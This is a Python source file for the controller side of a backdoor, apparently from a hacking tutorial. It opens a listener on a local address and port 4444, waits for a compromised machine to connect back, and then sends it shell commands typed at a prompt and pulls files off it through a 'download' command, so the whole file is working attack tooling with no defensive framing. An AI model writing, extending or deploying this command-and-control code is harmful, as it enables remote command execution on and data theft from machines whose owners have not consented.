import socket
import json

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def write_file(self, path, contents):
        with open(path, "wb") as file:
            file.write(contents)
        return '[+] Download successful'

    def receive_file(self, path):
        with open(path, "wb") as file:
            while True:
                chunk = self.connection.recv(1024)
                if chunk.endswith(b"DONE"):
                    file.write(chunk[:-4])  # Write the chunk except 'DONE' marker
                    break
                file.write(chunk)
        return '[+] Download successful'

    def run(self):
        while True:
            command = input(">> ").split(" ")

            # Handle download command separately
            if command[0] == "download":
                file_path = command[1]
                self.reliable_send(command)  # Inform backdoor to send file
                self.receive_file(file_path)  # Receive the file
                print("[+] File downloaded successfully")
            else:
                result = self.execute_remotely(command)
                print(result)

my_listener = Listener("192.168.0.35", 4444)
my_listener.run()
